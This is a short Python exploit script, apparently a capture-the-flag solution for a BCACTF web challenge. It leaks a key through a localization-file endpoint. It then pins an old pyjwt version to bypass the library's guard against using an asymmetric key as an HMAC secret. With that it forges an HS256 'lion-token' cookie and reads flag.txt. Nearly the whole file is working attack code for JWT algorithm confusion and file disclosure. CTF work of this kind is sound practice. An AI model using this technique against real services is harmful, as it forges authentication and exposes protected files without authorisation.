#!/usr/local/bin/python3.7
"""
run with python3.7 bcz we need `pyjwt==0.4.3` to run thuis bcz 
'asymmetric key or x509 certificate and should not be used as an HMAC secret'
but pyjwt version 0.4.3 lets us use this. install this by running the

`pip install pyjwt==0.4.3`
"""
import jwt
import requests

s = requests.Session()

url = "http://web.bcactf.com:49159/"

s.post(url + "localization-language", data={"language":"key"})

r = s.get(url + "localisation-file")

#print(r.headers)
#print(r.text)
key = str(r.text)

token = jwt.encode({"language": "flag.txt"}, key, algorithm="HS256")

#print(token)

r = requests.get(url +"localisation-file", cookies={"lion-token": token.decode()})

print(r.text)
